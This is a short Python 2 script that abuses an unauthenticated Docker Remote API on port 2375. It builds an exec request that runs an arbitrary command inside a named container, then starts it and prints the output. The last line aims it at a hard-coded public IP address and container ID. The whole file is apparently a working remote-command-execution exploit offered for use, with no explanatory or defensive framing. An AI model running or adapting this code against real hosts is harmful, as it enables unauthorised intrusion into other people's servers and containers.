#!/usr/bin/python
# -*- coding:utf-8 -*- 

import json
import requests
import sys

def requestCid(ip,ids,cmd):
#    proxies = {"http": "http://127.0.0.1:8090"}
    headers = {'content-type': 'application/json'}
    cmds=cmd.split(' ')
    cargs=''
    if(len(cmds)>1):
        for x in xrange(0,len(cmds)):
            cargs+='"%s" '%cmds[x]
        cargs=','.join(cargs.split(' '))[0:-1]
    else:
        cargs='"%s"'%cmd
    payload='{"AttachStdin": false, "AttachStdout":true,"AttachStderr":true,"Tty":false,"Cmd":[ %s],"WorkingDir": "/","env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/opt/ibm/imaserver/bin"]}'%cargs
    try:
	    resp=requests.post('http://%s:2375/containers/%s/exec'%(ip,ids), data=payload,headers=headers)
    except:
	    print 'shell fail'
	    return False
    #resp=requests.post('http://%s:2375/containers/%s/exec'%(ip,ids), data=payload,headers=headers,proxies=proxies)
    if 'No such' in  resp.text:
    	    print 'no such cid'
	    return False
    else :
	    if resp.text:
		try :
		    	return json.loads(resp.text)['Id']
		except:
			return False
	    else:
		return False


def CommandExec(ip,cid):
    headers = {'content-type': 'application/json'}
    payload='{"Detach": false,"Tty": false}'
    resp=requests.post('http://%s:2375/exec/%s/start'%(ip,cid), data=payload,headers=headers)
    return resp.text



print CommandExec('182.254.138.210','b64d9d492ec8ba39de3f416b76fc5a2f41c7c94f0c9a8a381073c87bf85e1e27')
